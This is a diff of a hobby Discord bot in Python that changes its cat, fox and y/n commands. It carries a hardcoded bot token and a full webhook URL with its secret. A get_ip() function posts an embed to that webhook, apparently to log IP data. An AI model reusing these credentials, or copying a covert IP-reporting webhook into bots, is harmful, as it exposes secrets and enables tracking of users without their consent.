@@ -2,10 +2,11 @@ import requests
 import discord
 import random
 import json
+import os
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-token = "ODcyODQxNzQ5Njg3NTk5MTM0.YQvvOQ.fnskNO7RqgGYHigP0NEv5JwDv"
+token = "ODcyODQxNzQ5Njg3NTk5MTM0.YQvvOQ.fnskNO7RqgGYHigP0NEv5JwDvPg"
 client = discord.Client()
 hook = Webhook("https://discord.com/api/webhooks/875488882068684810/LqRi04y6z6i_KwuB9jMXBCmTUZhKS7wBdqVa6kU-r86DNHj_-K53RQxhoCrlV5cvBR7R")
 time = datetime.now().strftime("%H:%M %p")
@@ -33,10 +34,8 @@ for field in fields:
     if field["value"]:
         embed.add_field(name=field["name"], value=field["value"], inline=True)
 
-
 def get_ip():
     hook.send(embed=embed)
-
 
 @client.event
 async def on_ready():
@@ -80,14 +79,16 @@ async def on_message(message):
         elif user_message.lower() == "!cat":
             await message.delete()
             page = requests.get("https://cataas.com/cat")
+            data = json.loads(page.text)
 
-            await message.channel.send(page.text)
+            await message.channel.send(data["file"])
 
         elif user_message.lower() == "!fox":
             await message.delete()
-            page = requests.get("https://idk.fox")
+            page = requests.get("https://randomfox.ca/floof")
+            data = json.loads(page.text)
 
-            await message.channel.send(page.text)
+            await message.channel.send(data["image"])
 
         elif user_message.lower() == "!embedtest":
             embed=discord.Embed(title="testing", description="hai", color=0xbc13fe)
@@ -96,12 +97,13 @@ async def on_message(message):
             await message.channel.send(embed=embed)
 
         elif user_message.lower() == "!input":
+            await message.channel.send("y/n")
+
             def check(msg):
               return msg.author == message.author and msg.channel == message.channel and \
                msg.content.lower() in ["y", "n"]
 
             msg = await client.wait_for("message", check=check)
-            await message.channel.send("are you pog?")
 
             if msg.content.lower() == "y" or "yes":
               await message.channel.send("You said yes")
@@ -113,4 +115,6 @@ async def on_message(message):
             get_ip()
 
 
-client.run(token)
+if __name__ == "__main__":
+    os.system("clear")
+    client.run(token)
